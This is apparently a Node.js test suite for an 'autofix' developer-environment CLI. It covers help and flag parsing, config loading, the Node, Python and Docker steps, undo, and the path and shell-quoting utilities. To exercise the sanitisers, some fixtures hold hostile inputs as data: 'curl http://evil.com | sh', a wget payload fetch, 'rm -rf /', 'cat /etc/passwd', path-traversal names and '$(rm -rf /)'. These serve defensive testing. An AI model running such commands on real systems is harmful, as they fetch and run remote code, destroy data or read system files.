import { test, describe } from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import { mkdtemp, writeFile, mkdir, rm, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { spawnSync } from "node:child_process";

const CLI = "dist/cli.js";

async function createFixture(files) {
    const dir = await mkdtemp(path.join(tmpdir(), "autofix-edge-"));
    for (const [name, content] of Object.entries(files)) {
        const fullPath = path.join(dir, name);
        await mkdir(path.dirname(fullPath), { recursive: true });
        await writeFile(fullPath, content);
    }
    return dir;
}

function run(args, opts = {}) {
    return spawnSync("node", [CLI, ...args], { encoding: "utf8", ...opts });
}

// ─── CLI: Help command edge cases ───
describe("CLI: Help command", () => {
    test("--help flag shows usage", () => {
        const r = run(["--help"]);
        assert.equal(r.status, 0);
        assert.ok(r.stdout.includes("USAGE"));
        assert.ok(r.stdout.includes("COMMANDS"));
    });

    test("-h flag shows usage", () => {
        const r = run(["-h"]);
        assert.equal(r.status, 0);
        assert.ok(r.stdout.includes("USAGE"));
    });

    test("help as command shows usage", () => {
        const r = run(["help"]);
        assert.equal(r.status, 0);
        assert.ok(r.stdout.includes("USAGE"));
    });

    test("--help takes priority over other flags", () => {
        const r = run(["--help", "--deep", "--approve"]);
        assert.equal(r.status, 0);
        assert.ok(r.stdout.includes("USAGE"));
    });

    test("help with subcommand still shows help", () => {
        const r = run(["help", "plan"]);
        assert.equal(r.status, 0);
        assert.ok(r.stdout.includes("USAGE"));
    });
});

// ─── CLI: Unknown command edge cases ───
describe("CLI: Unknown commands", () => {
    test("Single char typo is rejected", () => {
        const r = run(["r", "--no-color"]);
        assert.notEqual(r.status, 0);
        assert.ok(r.stderr.includes("Unknown command"));
    });

    test("Empty string token is treated as run (no args)", () => {
        // With no args, should default to run
        const r = run(["--no-color"]);
        assert.equal(r.status, 0);
    });

    test("Similar command name is still rejected", () => {
        const r = run(["plans", "--no-color"]);
        assert.notEqual(r.status, 0);
        assert.ok(r.stderr.includes("Unknown command"));
    });

    test("Case-sensitive: Plan (uppercase P) is rejected", () => {
        const r = run(["Plan", "--no-color"]);
        assert.notEqual(r.status, 0);
        assert.ok(r.stderr.includes("Unknown command"));
    });

    test("Random gibberish is rejected", () => {
        const r = run(["xyzzy123", "--no-color"]);
        assert.notEqual(r.status, 0);
        assert.ok(r.stderr.includes("Unknown command"));
    });
});

// ─── CLI: plan command ───
describe("CLI: plan command", () => {
    test("plan produces structured output", () => {
        const r = run(["plan", "--no-color"]);
        assert.equal(r.status, 0);
        assert.ok(r.stdout.includes("Detected environment"));
        assert.ok(r.stdout.includes("Plan/Actions"));
    });

    test("plan --quiet still works", () => {
        const r = run(["plan", "--quiet", "--no-color"]);
        assert.equal(r.status, 0);
    });

    test("plan --json outputs valid JSON", () => {
        const r = run(["plan", "--no-color", "--json"]);
        assert.equal(r.status, 0);
        // The stdout should contain JSON output
        const jsonStart = r.stdout.indexOf("{");
        assert.ok(jsonStart >= 0, "Should contain JSON object");
        const jsonStr = r.stdout.slice(jsonStart);
        const parsed = JSON.parse(jsonStr);
        assert.ok(parsed.runId, "JSON should have runId");
        assert.ok(parsed.steps, "JSON should have steps");
        assert.ok(parsed.summary, "JSON should have summary");
    });

    test("plan --verbose shows phase info", () => {
        const r = run(["plan", "--verbose", "--no-color"]);
        assert.equal(r.status, 0);
    });
});

// ─── CLI: doctor command ───
describe("CLI: doctor command", () => {
    test("doctor exits cleanly in this project", () => {
        const r = run(["doctor", "--no-color"]);
        // doctor may exit 1 if issues found, which is expected behaviour
        assert.ok(r.status === 0 || r.status === 1);
        assert.ok(r.stdout.includes("Detected environment"));
    });

    test("doctor --json outputs valid JSON", () => {
        const r = run(["doctor", "--no-color", "--json"]);
        const jsonStart = r.stdout.indexOf("{");
        assert.ok(jsonStart >= 0);
        const parsed = JSON.parse(r.stdout.slice(jsonStart));
        assert.equal(parsed.command, "doctor");
    });
});

// ─── CLI: report command ───
describe("CLI: report command", () => {
    test("report with no previous run exits non-zero", () => {
        const tmpDir = tmpdir();
        const r = run(["report", "--no-color"], { cwd: tmpDir });
        // May fail if no report exists at cwd
        assert.ok(r.status === 0 || r.status === 1);
    });
});

// ─── CLI: undo command ───
describe("CLI: undo command", () => {
    test("undo with no previous report exits non-zero", () => {
        const tmpDir = tmpdir();
        const r = run(["undo", "--no-color"], { cwd: tmpDir });
        assert.ok(r.status === 0 || r.status === 1);
    });
});

// ─── CLI: Flags parsing edge cases ───
describe("CLI: Flag parsing", () => {
    test("--focus without value is ignored gracefully", () => {
        const r = run(["plan", "--focus", "--no-color"]);
        // --no-color is consumed as focus value but doesn't match valid values, so default "all"
        assert.ok(r.status === 0 || r.status === 1);
    });

    test("--focus node restricts to node subsystem", () => {
        const r = run(["plan", "--focus", "node", "--no-color", "--json"]);
        assert.equal(r.status, 0);
        const jsonStart = r.stdout.indexOf("{");
        const parsed = JSON.parse(r.stdout.slice(jsonStart));
        assert.equal(parsed.flags.focus, "node");
    });

    test("--focus python restricts to python subsystem", () => {
        const r = run(["plan", "--focus", "python", "--no-color", "--json"]);
        assert.equal(r.status, 0);
    });

    test("--dry-run is equivalent to plan", () => {
        const r = run(["run", "--dry-run", "--no-color", "--json"]);
        assert.equal(r.status, 0);
        const jsonStart = r.stdout.indexOf("{");
        const parsed = JSON.parse(r.stdout.slice(jsonStart));
        // All steps should be planned/proposed, none executed
        for (const step of parsed.steps) {
            assert.ok(step.status === "planned" || step.status === "proposed",
                `Step ${step.id} should be planned/proposed in dry run, got ${step.status}`);
        }
    });

    test("--checks with invalid values are filtered out", () => {
        const r = run(["plan", "--checks", "lint,invalid,test", "--no-color", "--json"]);
        assert.equal(r.status, 0);
        const jsonStart = r.stdout.indexOf("{");
        const parsed = JSON.parse(r.stdout.slice(jsonStart));
        const checks = parsed.flags.checks;
        assert.ok(!checks.includes("invalid"), "Invalid check kind should be filtered");
        assert.ok(checks.includes("lint"));
        assert.ok(checks.includes("test"));
    });

    test("--kill-ports without value enables port cleanup with defaults", () => {
        const r = run(["plan", "--kill-ports", "--no-color", "--json"]);
        assert.equal(r.status, 0);
        const jsonStart = r.stdout.indexOf("{");
        const parsed = JSON.parse(r.stdout.slice(jsonStart));
        assert.ok(Array.isArray(parsed.flags.killPorts));
    });

    test("--kill-ports with specific ports", () => {
        const r = run(["plan", "--kill-ports", "3000,8080", "--no-color", "--json"]);
        assert.equal(r.status, 0);
        const jsonStart = r.stdout.indexOf("{");
        const parsed = JSON.parse(r.stdout.slice(jsonStart));
        assert.deepEqual(parsed.flags.killPorts, [3000, 8080]);
    });

    test("multiple conflicting flags are all respected", () => {
        const r = run(["plan", "--deep", "--approve", "--verbose", "--quiet", "--no-color", "--json"]);
        assert.equal(r.status, 0);
        const jsonStart = r.stdout.indexOf("{");
        const parsed = JSON.parse(r.stdout.slice(jsonStart));
        assert.equal(parsed.flags.deep, true);
        assert.equal(parsed.flags.approve, true);
        assert.equal(parsed.flags.verbose, true);
        assert.equal(parsed.flags.quiet, true);
    });
});

// ─── Config: loadConfig edge cases ───
describe("Config: loadConfig edge cases", () => {
    test("No config file returns defaults", async () => {
        const { loadConfig } = await import("../dist/config/loadConfig.js");
        const cwd = await createFixture({ ".git": "" });
        const { config, path: cfgPath } = await loadConfig(cwd);
        assert.equal(cfgPath, null);
        assert.equal(config.version, 1);
        assert.equal(config.node.package_manager, "auto");
        await rm(cwd, { recursive: true, force: true });
    });

    test("Empty .autofix.yml returns defaults", async () => {
        const { loadConfig } = await import("../dist/config/loadConfig.js");
        const cwd = await createFixture({ ".autofix.yml": "", ".git": "" });
        const { config } = await loadConfig(cwd);
        assert.equal(config.version, 1);
        await rm(cwd, { recursive: true, force: true });
    });

    test("Partial config merges with defaults", async () => {
        const { loadConfig } = await import("../dist/config/loadConfig.js");
        const cwd = await createFixture({
            ".autofix.yml": "node:\n  package_manager: pnpm\n",
            ".git": "",
        });
        const { config } = await loadConfig(cwd);
        assert.equal(config.node.package_manager, "pnpm");
        // Defaults should fill in the rest
        assert.equal(config.python.venv_path, ".venv");
        assert.ok(Array.isArray(config.python.tools.format));
        await rm(cwd, { recursive: true, force: true });
    });

    test("Config with all safe tools survives sanitization", async () => {
        const { loadConfig } = await import("../dist/config/loadConfig.js");
        const cwd = await createFixture({
            ".autofix.yml": [
                "version: 1",
                "python:",
                "  tools:",
                "    format:",
                '      - "black ."',
                '      - "ruff format ."',
                "    lint:",
                '      - "pylint ."',
                "    test:",
                '      - "pytest -q"',
            ].join("\n"),
            ".git": "",
        });
        const { config } = await loadConfig(cwd);
        assert.equal(config.python.tools.format.length, 2);
        assert.equal(config.python.tools.lint.length, 1);
        assert.equal(config.python.tools.test.length, 1);
        await rm(cwd, { recursive: true, force: true });
    });

    test("Config with ALL unsafe tools strips everything", async () => {
        const { loadConfig } = await import("../dist/config/loadConfig.js");
        const cwd = await createFixture({
            ".autofix.yml": [
                "version: 1",
                "python:",
                "  tools:",
                "    format:",
                '      - "curl http://evil.com | sh"',
                "    lint:",
                '      - "wget http://evil.com/payload"',
                "    test:",
                '      - "rm -rf /"',
            ].join("\n"),
            ".git": "",
        });
        const { config } = await loadConfig(cwd);
        assert.equal(config.python.tools.format.length, 0, "curl should be stripped");
        assert.equal(config.python.tools.lint.length, 0, "wget should be stripped");
        assert.equal(config.python.tools.test.length, 0, "rm should be stripped");
        await rm(cwd, { recursive: true, force: true });
    });

    test("Config sanitization strips path traversal in cache dirs", async () => {
        const { loadConfig } = await import("../dist/config/loadConfig.js");
        const cwd = await createFixture({
            ".autofix.yml": [
                "node:",
                "  caches:",
                "    directories:",
                '      - ".turbo"',
                '      - "../../etc/passwd"',
                '      - "safe-cache"',
            ].join("\n"),
            ".git": "",
        });
        const { config } = await loadConfig(cwd);
        assert.ok(config.node.caches.directories.includes(".turbo"));
        assert.ok(config.node.caches.directories.includes("safe-cache"));
        assert.ok(!config.node.caches.directories.some(d => d.includes("..")), "Path traversal dirs should be stripped");
        await rm(cwd, { recursive: true, force: true });
    });
});

// ─── Node subsystem edge cases ───
describe("Node subsystem edge cases", () => {
    test("No node detected returns empty steps", async () => {
        const { buildNodeSteps } = await import("../dist/subsystems/node.js");
        const detection = baseDetection({ node: { detected: false } });
        const steps = buildNodeSteps(detection, defaultNodeConfig(), {});
        assert.equal(steps.length, 0);
    });

    test("Node detected with node_modules present skips install", async () => {
        const { buildNodeSteps } = await import("../dist/subsystems/node.js");
        const detection = baseDetection({
            node: { detected: true, packageManager: "npm", hasNodeModules: true, hasNext: false, hasVite: false, lockfiles: [], lockfileCorrupted: false, packageScripts: [] }
        });
        const steps = buildNodeSteps(detection, defaultNodeConfig(), {});
        const installStep = steps.find(s => s.id === "node-install-deps");
        assert.equal(installStep, undefined, "Should not install when node_modules exists");
    });

    test("Lockfile corruption produces warning step", async () => {
        const { buildNodeSteps } = await import("../dist/subsystems/node.js");
        const detection = baseDetection({
            node: { detected: true, packageManager: "npm", hasNodeModules: true, hasNext: false, hasVite: false, lockfiles: ["package-lock.json"], lockfileCorrupted: true, packageScripts: [] }
        });
        const steps = buildNodeSteps(detection, defaultNodeConfig(), {});
        const corruptStep = steps.find(s => s.id === "node-lockfile-corruption-detected");
        assert.ok(corruptStep, "Should produce corruption warning step");
        assert.equal(corruptStep.status, "proposed");
    });

    test("Force fresh with deep enables lockfile regeneration", async () => {
        const { buildNodeSteps } = await import("../dist/subsystems/node.js");
        const detection = baseDetection({
            node: { detected: true, packageManager: "npm", hasNodeModules: true, hasNext: false, hasVite: false, lockfiles: ["package-lock.json"], lockfileCorrupted: true, packageScripts: [] }
        });
        const flags = { forceFresh: true, deep: true };
        const steps = buildNodeSteps(detection, defaultNodeConfig(), flags);
        const regenStep = steps.find(s => s.id === "node-remove-lockfiles-force-fresh");
        assert.ok(regenStep, "Regen step should exist with force-fresh + deep");
        assert.equal(regenStep.irreversible, true);
    });

    test("Deep cleanup adds node_modules removal", async () => {
        const { buildNodeSteps } = await import("../dist/subsystems/node.js");
        const detection = baseDetection({
            node: { detected: true, packageManager: "npm", hasNodeModules: true, hasNext: false, hasVite: false, lockfiles: [], lockfileCorrupted: false, packageScripts: [] }
        });
        const config = defaultNodeConfig();
        config.node.deep_cleanup.remove_node_modules = true;
        const steps = buildNodeSteps(detection, config, { deep: true });
        const removeStep = steps.find(s => s.id === "node-remove-node-modules");
        assert.ok(removeStep, "Should remove node_modules in deep mode");
        assert.equal(removeStep.destructive, true);
    });

    test("Package manager yarn in config produces yarn commands", async () => {
        const { buildNodeSteps } = await import("../dist/subsystems/node.js");
        const detection = baseDetection({
            node: { detected: true, packageManager: "npm", hasNodeModules: false, hasNext: false, hasVite: false, lockfiles: [], lockfileCorrupted: false, packageScripts: [] }
        });
        const config = defaultNodeConfig();
        config.node.package_manager = "yarn";
        const steps = buildNodeSteps(detection, config, {});
        const installStep = steps.find(s => s.id === "node-install-deps");
        assert.ok(installStep.commands[0].startsWith("yarn"), "Should use yarn");
    });

    test("Package manager pnpm in config produces pnpm commands", async () => {
        const { buildNodeSteps } = await import("../dist/subsystems/node.js");
        const detection = baseDetection({
            node: { detected: true, packageManager: "npm", hasNodeModules: false, hasNext: false, hasVite: false, lockfiles: [], lockfileCorrupted: false, packageScripts: [] }
        });
        const config = defaultNodeConfig();
        config.node.package_manager = "pnpm";
        const steps = buildNodeSteps(detection, config, {});
        const installStep = steps.find(s => s.id === "node-install-deps");
        assert.ok(installStep.commands[0].startsWith("pnpm"), "Should use pnpm");
    });
});

// ─── Python subsystem edge cases ───
describe("Python subsystem edge cases", () => {
    test("No python detected returns empty steps", async () => {
        const { buildPythonSteps } = await import("../dist/subsystems/python.js");
        const detection = baseDetection({ python: { detected: false } });
        const config = { python: { venv_path: ".venv", install: { prefer: "pip" }, tools: { format: [], lint: [], test: [] } } };
        const steps = buildPythonSteps(detection, config, {});
        assert.equal(steps.length, 0);
    });

    test("Missing venv creates venv step", async () => {
        const { buildPythonSteps } = await import("../dist/subsystems/python.js");
        const detection = baseDetection({
            python: { detected: true, hasPyproject: true, hasRequirements: false, venvPath: ".venv", venvExists: false }
        });
        const config = { python: { venv_path: ".venv", install: { prefer: "pip" }, tools: { format: [], lint: [], test: [] } } };
        const steps = buildPythonSteps(detection, config, {});
        assert.ok(steps.find(s => s.id === "python-create-venv"));
    });

    test("Deep mode adds venv reset step", async () => {
        const { buildPythonSteps } = await import("../dist/subsystems/python.js");
        const detection = baseDetection({
            python: { detected: true, hasPyproject: true, hasRequirements: false, venvPath: ".venv", venvExists: true }
        });
        const config = { python: { venv_path: ".venv", install: { prefer: "pip" }, tools: { format: [], lint: [], test: [] } } };
        const steps = buildPythonSteps(detection, config, { deep: true });
        const resetStep = steps.find(s => s.id === "python-reset-venv");
        assert.ok(resetStep);
        assert.equal(resetStep.irreversible, true);
    });

    test("Install prefer uv produces uv command", async () => {
        const { buildPythonSteps } = await import("../dist/subsystems/python.js");
        const detection = baseDetection({
            python: { detected: true, hasPyproject: false, hasRequirements: true, venvPath: ".venv", venvExists: true }
        });
        const config = { python: { venv_path: ".venv", install: { prefer: "uv" }, tools: { format: [], lint: [], test: [] } } };
        const steps = buildPythonSteps(detection, config, {});
        const installStep = steps.find(s => s.id === "python-install-deps");
        assert.ok(installStep.commands[0].includes("uv"));
    });
});

// ─── Docker subsystem edge cases ───
describe("Docker subsystem edge cases", () => {
    test("No docker detected returns empty steps", async () => {
        const { buildDockerSteps } = await import("../dist/subsystems/docker.js");
        const detection = baseDetection({ docker: { detected: false } });
        const config = { docker: { safe_down: true, rebuild: true, prune: false } };
        const steps = buildDockerSteps(detection, config, {});
        assert.equal(steps.length, 0);
    });

    test("Docker detected with safe_down adds down step", async () => {
        const { buildDockerSteps } = await import("../dist/subsystems/docker.js");
        const detection = baseDetection({ docker: { detected: true, composeFile: "docker-compose.yml" } });
        const config = { docker: { safe_down: true, rebuild: false, prune: false } };
        const steps = buildDockerSteps(detection, config, {});
        assert.equal(steps.length, 1);
        assert.equal(steps[0].id, "docker-compose-down");
    });

    test("Docker prune requires deep or approve flag", async () => {
        const { buildDockerSteps } = await import("../dist/subsystems/docker.js");
        const detection = baseDetection({ docker: { detected: true, composeFile: "compose.yml" } });
        const config = { docker: { safe_down: false, rebuild: false, prune: false } };
        const noDeep = buildDockerSteps(detection, config, {});
        assert.ok(!noDeep.find(s => s.id === "docker-prune"), "No prune without deep/approve");
        const withDeep = buildDockerSteps(detection, config, { deep: true });
        assert.ok(withDeep.find(s => s.id === "docker-prune"), "Prune with deep");
    });
});

// ─── Checks subsystem edge cases ───
describe("Checks subsystem edge cases", () => {
    test("No python and no node returns empty steps", async () => {
        const { buildCheckSteps } = await import("../dist/subsystems/checks.js");
        const detection = baseDetection();
        const config = { python: { tools: { format: [], lint: [], test: [] } }, checks: { default: ["format", "lint", "test"] } };
        const steps = buildCheckSteps(detection, config, {});
        assert.equal(steps.length, 0);
    });

    test("Node checks only run for matching packageScripts", async () => {
        const { buildCheckSteps } = await import("../dist/subsystems/checks.js");
        const detection = baseDetection({
            node: { detected: true, packageManager: "npm", hasNodeModules: true, hasNext: false, hasVite: false, lockfiles: [], lockfileCorrupted: false, packageScripts: ["lint"] }
        });
        const config = { python: { tools: { format: [], lint: [], test: [] } }, checks: { default: ["format", "lint", "test"] } };
        const steps = buildCheckSteps(detection, config, {}, "node");
        assert.equal(steps.length, 1);
        assert.equal(steps[0].id, "check-node-lint");
    });

    test("Mixed safe and unsafe commands with all check kinds", async () => {
        const { buildCheckSteps } = await import("../dist/subsystems/checks.js");
        const detection = baseDetection({
            python: { detected: true, hasPyproject: true, hasRequirements: false, venvPath: ".venv", venvExists: true }
        });
        const config = {
            python: {
                venv_path: ".venv", install: { prefer: "pip" },
                tools: {
                    format: ["ruff format ."],
                    lint: ["ruff check .", "cat /etc/passwd"],
                    test: ["pytest -q"],
                },
            },
            checks: { default: ["format", "lint", "test"] },
        };
        const steps = buildCheckSteps(detection, config, { checks: ["format", "lint", "test"] }, "python");
        const safe = steps.filter(s => s.status === "planned");
        const rejected = steps.filter(s => s.status === "proposed");
        assert.equal(safe.length, 3, "ruff format, ruff check, pytest should be planned");
        assert.equal(rejected.length, 1, "cat should be rejected");
    });
});

// ─── Undo edge cases ───
describe("Undo edge cases", () => {
    test("Undo with empty steps array succeeds", async () => {
        const { undoLatest } = await import("../dist/core/undo.js");
        const cwd = await createFixture({});
        const reportPath = path.join(cwd, "report.json");
        await writeFile(reportPath, JSON.stringify({
            runId: "test", command: "run", timestamp: new Date().toISOString(),
            steps: [], summary: { total: 0, success: 0, failed: 0, proposed: 0, skipped: 0 },
        }));
        const result = await undoLatest(reportPath, cwd);
        assert.ok(result.report);
        assert.equal(result.entries.length, 0);
        await rm(cwd, { recursive: true, force: true });
    });

    test("Undo with missing report file returns null report", async () => {
        const { undoLatest } = await import("../dist/core/undo.js");
        const cwd = await createFixture({});
        const result = await undoLatest(path.join(cwd, "nonexistent.json"), cwd);
        assert.equal(result.report, null);
        assert.equal(result.entries.length, 0);
        await rm(cwd, { recursive: true, force: true });
    });

    test("Undo skips non-undoable steps", async () => {
        const { undoLatest } = await import("../dist/core/undo.js");
        const cwd = await createFixture({});
        const reportPath = path.join(cwd, "report.json");
        await writeFile(reportPath, JSON.stringify({
            runId: "test", command: "run", timestamp: new Date().toISOString(),
            steps: [{ id: "s1", title: "test", subsystem: "node", phase: "node", rationale: "t", commands: [], destructive: false, irreversible: false, undoable: false, status: "success" }],
            summary: { total: 1, success: 1, failed: 0, proposed: 0, skipped: 0 },
        }));
        const result = await undoLatest(reportPath, cwd);
        assert.equal(result.entries.length, 1);
        assert.ok(result.entries[0].skipped.length > 0, "Non-undoable step should be skipped");
        await rm(cwd, { recursive: true, force: true });
    });

    test("Multiple path traversal variants are all blocked", async () => {
        const { undoLatest } = await import("../dist/core/undo.js");
        const cwd = await createFixture({});
        const snapshotDir = path.join(cwd, ".autofix", "snapshots", "test-run", "test-step");
        await mkdir(snapshotDir, { recursive: true });
        const maliciousNames = [".._.._etc_passwd", ".._.._tmp_evil", ".._.._.._.._root_.bashrc"];
        for (const name of maliciousNames) {
            await writeFile(path.join(snapshotDir, name), "malicious");
        }
        const reportPath = path.join(cwd, "report.json");
        await writeFile(reportPath, JSON.stringify({
            runId: "test-run", command: "run", timestamp: new Date().toISOString(),
            steps: [{
                id: "test-step", title: "test", subsystem: "node", phase: "node", rationale: "t",
                commands: [], destructive: false, irreversible: false, undoable: true,
                snapshotPaths: maliciousNames.map(n => path.join(snapshotDir, n)),
                status: "success",
            }],
            summary: { total: 1, success: 1, failed: 0, proposed: 0, skipped: 0 },
        }));
        const result = await undoLatest(reportPath, cwd);
        assert.equal(result.entries[0].failed.length, maliciousNames.length, "All traversal paths should be blocked");
        for (const f of result.entries[0].failed) {
            assert.ok(f.includes("blocked"), `Failed entry should mention blocked: ${f}`);
        }
        await rm(cwd, { recursive: true, force: true });
    });
});

// ─── Utils edge cases ───
describe("Utils: shellQuote edge cases", () => {
    test("Empty string is quoted", async () => {
        const { shellQuote } = await import("../dist/utils/process.js");
        assert.equal(shellQuote(""), "''");
    });

    test("String with newlines is safe", async () => {
        const { shellQuote } = await import("../dist/utils/process.js");
        const result = shellQuote("line1\nline2");
        assert.ok(result.startsWith("'") && result.endsWith("'"));
    });

    test("String with backticks is safe", async () => {
        const { shellQuote } = await import("../dist/utils/process.js");
        const result = shellQuote("`whoami`");
        assert.ok(result.startsWith("'") && result.endsWith("'"));
    });

    test("String with dollar expansion is safe", async () => {
        const { shellQuote } = await import("../dist/utils/process.js");
        const result = shellQuote("$(rm -rf /)");
        // Single quotes prevent shell expansion — the literal $( is inside single quotes, which is safe
        assert.ok(result.startsWith("'") && result.endsWith("'"));
        assert.equal(result, "'$(rm -rf /)'", "Dollar expansion wrapped in single quotes is shell-safe");
    });
});

describe("Utils: isSafePath edge cases", () => {
    test("Simple directory names are safe", async () => {
        const { isSafePath } = await import("../dist/utils/process.js");
        assert.equal(isSafePath(".cache"), true);
        assert.equal(isSafePath("node_modules/.vite"), true);
        assert.equal(isSafePath(".turbo"), true);
        assert.equal(isSafePath("dist"), true);
    });

    test("All shell metacharacters are rejected", async () => {
        const { isSafePath } = await import("../dist/utils/process.js");
        const dangerous = [";", "|", "&", "`", "$", "(", ")", "{", "}", "<", ">", "!", "~", "'", '"'];
        for (const char of dangerous) {
            assert.equal(isSafePath(`dir${char}name`), false, `'${char}' should be rejected`);
        }
    });

    test("Path traversal patterns are rejected", async () => {
        const { isSafePath } = await import("../dist/utils/process.js");
        assert.equal(isSafePath("../secret"), false);
        assert.equal(isSafePath("foo/../../etc"), false);
        assert.equal(isSafePath(".."), false);
    });
});

// ─── Environment detect edge cases ───
describe("Environment detection edge cases", () => {
    test("Empty directory detects nothing", async () => {
        const { detectEnvironment } = await import("../dist/core/detectEnvironment.js");
        const cwd = await createFixture({});
        const config = { python: { venv_path: ".venv" } };
        const det = await detectEnvironment(cwd, config);
        assert.equal(det.node.detected, false);
        assert.equal(det.python.detected, false);
        assert.equal(det.docker.detected, false);
        await rm(cwd, { recursive: true, force: true });
    });

    test("Malformed package.json is handled gracefully", async () => {
        const { detectEnvironment } = await import("../dist/core/detectEnvironment.js");
        const cwd = await createFixture({ "package.json": "not json at all {{{" });
        const config = { python: { venv_path: ".venv" } };
        const det = await detectEnvironment(cwd, config);
        assert.equal(det.node.detected, true, "package.json exists so detected is true");
        assert.deepEqual(det.node.packageScripts, [], "Scripts should be empty for malformed JSON");
        await rm(cwd, { recursive: true, force: true });
    });

    test("All compose file variants are detected", async () => {
        const { detectEnvironment } = await import("../dist/core/detectEnvironment.js");
        const variants = ["docker-compose.yml", "compose.yml", "docker-compose.yaml", "compose.yaml"];
        for (const variant of variants) {
            const cwd = await createFixture({ [variant]: "version: '3'" });
            const config = { python: { venv_path: ".venv" } };
            const det = await detectEnvironment(cwd, config);
            assert.equal(det.docker.detected, true, `${variant} should be detected`);
            assert.equal(det.docker.composeFile, variant);
            await rm(cwd, { recursive: true, force: true });
        }
    });

    test("Polyglot project detects all stacks", async () => {
        const { detectEnvironment } = await import("../dist/core/detectEnvironment.js");
        const cwd = await createFixture({
            "package.json": '{"scripts":{"test":"jest"}}',
            "requirements.txt": "flask\n",
            "docker-compose.yml": "version: '3'\n",
        });
        const config = { python: { venv_path: ".venv" } };
        const det = await detectEnvironment(cwd, config);
        assert.equal(det.node.detected, true);
        assert.equal(det.python.detected, true);
        assert.equal(det.docker.detected, true);
        await rm(cwd, { recursive: true, force: true });
    });
});

// ─── Port cleanup edge cases ───
describe("Port cleanup edge cases", () => {
    test("buildPortSteps returns empty when killPorts not set", async () => {
        const { buildPortSteps } = await import("../dist/core/planBuilder.js");
        const config = { ports: { default: [3000], extra: [] } };
        const steps = buildPortSteps({}, config);
        assert.equal(steps.length, 0);
    });

    test("buildPortSteps uses config ports when killPorts is empty array", async () => {
        const { buildPortSteps } = await import("../dist/core/planBuilder.js");
        const config = { ports: { default: [3000, 8080], extra: [9229] } };
        const steps = buildPortSteps({ killPorts: [] }, config);
        assert.equal(steps.length, 1);
        assert.equal(steps[0].commands.length, 3);
    });

    test("buildPortSteps uses explicit ports when provided", async () => {
        const { buildPortSteps } = await import("../dist/core/planBuilder.js");
        const config = { ports: { default: [3000], extra: [] } };
        const steps = buildPortSteps({ killPorts: [4000, 5000] }, config);
        assert.equal(steps[0].commands.length, 2);
        assert.ok(steps[0].commands[0].includes("4000"));
        assert.ok(steps[0].commands[1].includes("5000"));
    });
});

// ─── Cache clear commands edge cases ───
describe("CLI: Cache clear commands", () => {
    test("clear-npm-cache runs correctly", () => {
        const r = run(["clear-npm-cache", "--no-color"]);
        // npm cache clean may succeed or fail depending on env, both are valid
        assert.ok(r.status === 0 || r.status === 1);
    });
});

// ─── Helpers ───
function baseDetection(overrides = {}) {
    return {
        node: { detected: false, packageManager: "unknown", hasNodeModules: false, hasNext: false, hasVite: false, lockfiles: [], lockfileCorrupted: false, packageScripts: [] },
        python: { detected: false, hasPyproject: false, hasRequirements: false, venvPath: ".venv", venvExists: false },
        docker: { detected: false },
        environment: { hasEnv: false, hasEnvExample: false },
        engines: {},
        issues: [],
        ...overrides,
    };
}

function defaultNodeConfig() {
    return {
        node: {
            package_manager: "auto",
            caches: { next: false, vite: false, directories: [] },
            deep_cleanup: { remove_node_modules: false, remove_lockfile: false },
        },
    };
}
